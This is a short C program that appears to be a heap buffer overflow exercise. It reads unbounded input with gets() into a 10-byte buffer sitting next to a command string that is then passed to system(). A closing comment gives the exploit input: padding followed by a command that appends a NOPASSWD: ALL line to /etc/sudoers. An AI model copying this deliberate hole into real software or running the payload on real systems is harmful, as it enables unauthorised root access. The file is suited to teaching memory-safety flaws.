#include<stdio.h>
#include<string.h>

void buf_func();

void main(){
    
    printf("Hello World!\n");
    buf_func();
    printf("Anybody here?\n");
}

void buf_func()
{
    char *name;
    char *command;
	
	name = (char*) malloc(10);
    command = (char*) malloc(128);
	strcpy(command, "echo \"You are very cool\"");
	
	printf("The address of Name is: %d\n", name);
	printf("The address of Command is: %d\n", command);
	printf("The difference between address is: %d\n", command-name);
	
    printf("So tell me. Whats your name?\n");
    gets(name); //Get input from user(No restrictions on the amount of data that can be entered)
    
	system(command);
    return;
}

/*

Input that gains sudo access for an account:

echo "[...][username] ALL = NOPASSWD: ALL" >> /etc/sudoers

where:
[...] = amount of padding from the start of name to the beginning of command
[username] = the username that will recieve unrestricted sudo access